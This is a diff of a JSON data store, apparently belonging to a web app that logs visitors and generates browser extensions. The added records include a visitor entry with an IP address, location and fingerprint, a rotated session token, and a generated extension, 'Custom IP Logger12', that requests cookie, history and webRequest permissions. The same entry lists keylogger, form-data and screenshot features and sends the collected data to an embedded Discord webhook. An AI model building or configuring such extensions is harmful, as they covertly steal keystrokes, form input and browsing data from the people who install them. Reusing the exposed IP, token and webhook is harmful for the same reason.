@@ -761,13 +761,13 @@
       }
     ],
     [
-      "1aef5eb1-9b91-4cb2-88ab-f4ce2d10cf10",
+      "4f41f8a8-2d5c-427f-a14a-a3e51f52a807",
       {
         "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
-        "sessionToken": "1aef5eb1-9b91-4cb2-88ab-f4ce2d10cf10",
-        "expiresAt": "2025-10-01T15:33:19.211Z",
-        "id": "a141ae41-082e-4afa-9364-1f41d0db7dd0",
-        "createdAt": "2025-09-24T15:33:19.211Z"
+        "sessionToken": "4f41f8a8-2d5c-427f-a14a-a3e51f52a807",
+        "expiresAt": "2025-10-01T15:37:55.385Z",
+        "id": "85ff580f-9612-4ad4-9898-c950bec90bdd",
+        "createdAt": "2025-09-24T15:37:55.385Z"
       }
     ]
   ],
@@ -28307,6 +28307,59 @@
         "fingerprint": "ZGVza3RvcC1DaHJv",
         "timestamp": "2025-09-24T15:13:01.606Z"
       }
+    ],
+    [
+      "e8a676c2-bc69-4a82-abfd-e86edcc4731c",
+      {
+        "id": "e8a676c2-bc69-4a82-abfd-e86edcc4731c",
+        "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
+        "ipAddress": "72.213.229.99",
+        "userAgent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+        "referrer": "https://dc631ddc-421a-4fe0-a55e-d90f468b69d7-00-3irlistgl01wt.spock.replit.dev/extension-generator",
+        "location": "Tokyo, Tokyo, Japan (Estimated)",
+        "status": "success",
+        "country": "Japan",
+        "region": "Tokyo",
+        "city": "Tokyo",
+        "latitude": "35.6762",
+        "longitude": "139.6503",
+        "timezone": "Asia/Tokyo",
+        "isp": "Unknown ISP",
+        "organization": "Unknown",
+        "coordinates": "35.6762, 139.6503",
+        "isVpn": "unknown",
+        "isProxy": "unknown",
+        "threatLevel": "Unknown",
+        "vpnProvider": null,
+        "realLocation": null,
+        "deviceType": "desktop",
+        "browserName": "Chrome",
+        "browserVersion": "140.0.0.0",
+        "operatingSystem": "unknown",
+        "osVersion": "unknown",
+        "deviceBrand": "Apple",
+        "deviceModel": "unknown",
+        "architecture": "unknown",
+        "engine": "Blink",
+        "engineVersion": "140.0.0.0",
+        "isBot": false,
+        "isSuspicious": false,
+        "securityFlags": [],
+        "capabilities": [
+          "🌐 WebKit Support",
+          "📸 Screen Capture API",
+          "🎥 WebRTC Advanced",
+          "🔒 WebAssembly SIMD",
+          "📊 Web Share API",
+          "🌍 Web Locks API",
+          "💻 Full DOM Access",
+          "📂 File System API",
+          "🖱️ Pointer Events",
+          "⌨️ Keyboard API"
+        ],
+        "fingerprint": "ZGVza3RvcC1DaHJv",
+        "timestamp": "2025-09-24T15:40:20.985Z"
+      }
     ]
   ],
   "settings": [
@@ -28775,8 +28828,52 @@
         "createdAt": "2025-09-24T15:13:01.893Z",
         "lastWebhookSent": null
       }
+    ],
+    [
+      "8e6cf67a-69b8-4614-a9f6-7e2a7276354d",
+      {
+        "id": "8e6cf67a-69b8-4614-a9f6-7e2a7276354d",
+        "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
+        "extensionName": "Custom IP Logger12",
+        "extensionDescription": "Track visitor information and activity",
+        "extensionVersion": "1.0.0",
+        "permissions": [
+          "activeTab",
+          "storage",
+          "tabs",
+          "cookies",
+          "history",
+          "bookmarks",
+          "webRequest",
+          "geolocation",
+          "notifications"
+        ],
+        "features": [
+          "ip_tracking",
+          "geolocation",
+          "browser_info",
+          "screenshot",
+          "keylogger",
+          "form_data",
+          "click_tracking"
+        ],
+        "webhookUrl": "https://discord.com/api/webhooks/1419031818686169178/98lX9oudbNXapXXM2aQDE7GcAUr3lm0NM1f6qn4whXgB7boAf6dQnWYcT1y5Ni73DmiD",
+        "customCode": "",
+        "generationStatus": "success",
+        "errorMessage": null,
+        "downloadCount": 1,
+        "extensionId": "f5d06f81-9095-4596-8176-cb7a0a6553e1",
+        "ipAddress": "72.213.229.99",
+        "userAgent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+        "location": "Tokyo, Tokyo, Japan (Estimated)",
+        "zipFileSize": 12379,
+        "manifestValid": true,
+        "scriptsValid": true,
+        "createdAt": "2025-09-24T15:40:21.130Z",
+        "lastWebhookSent": null
+      }
     ]
   ],
-  "timestamp": "2025-09-24T15:34:28.227Z",
+  "timestamp": "2025-09-24T15:44:23.063Z",
   "version": "2.3"
 }
